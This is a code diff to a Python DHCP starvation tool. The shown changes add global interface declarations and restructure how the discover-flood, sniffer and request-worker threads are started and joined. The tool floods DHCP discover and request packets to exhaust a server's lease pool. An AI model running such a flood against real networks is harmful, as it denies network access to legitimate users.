@@ -33,7 +33,7 @@ def getRandTransID():
     return random.randint(0, 0xFFFFFFFF)
 
 
-# to discover range of dhcp leasing addresses
+# discover range of dhcp leasing addresses by flooding dhcp discover packets
 class DhcpDiscoverFlood(threading.Thread):
     def __init__(self, target_server, stop_event, count=-1):
         threading.Thread.__init__(self, name='discoverFlood', daemon=True)
@@ -105,6 +105,7 @@ def sendRequest(request_addr, src_mac):
 
 
 def sendPkt(pkt):
+    global iface
     sendp(pkt, iface=iface, verbose=0)
 
 
@@ -170,7 +171,6 @@ class DhcpSniffer(threading.Thread):
                 self.last_seen_dhcp = time.time()
         print('[<] dhcp sniffer thread finished')
 
-
 def main():
     desciption = "DHCP Starver"
     parser = ArgumentParser(description=desciption)
@@ -186,6 +186,7 @@ def main():
     parser.add_argument('-n', '--request-threads', default=3,
                         help='number of threads for sending out DHCP request (3)')
 
+    global iface
     parsed_args = parser.parse_args()
     iface = parsed_args.iface
     target = parsed_args.target
@@ -196,21 +197,24 @@ def main():
     ip_queue = PriorityQueue()
     stop_event = threading.Event()
 
-    DhcpSniffer(iface, ip_queue, stop_event).start()
+    threads = []
+
+    threads.append( DhcpSniffer(iface, ip_queue, stop_event) )
 
     for i in range(num_of_req_threads):
-        DhcpRequestWorker(ip_queue, stop_event).start()
+        threads.append( DhcpRequestWorker(ip_queue, stop_event) )
 
-    DhcpDiscoverFlood(target, stop_event, ip_leasing_count).start()
+    threads.append( DhcpDiscoverFlood(target, stop_event, ip_leasing_count) )
+
+    for t in threads:
+        t.start()
 
     if not persist:
         time.sleep(10)
         stop_event.set()
 
-    main_thread = threading.currentThread()
-    for t in threading.enumerate():
-        if t is not main_thread:
-            t.join()
+    for t in threads:
+        t.join()
 
     print('[<] main thread finished')
 
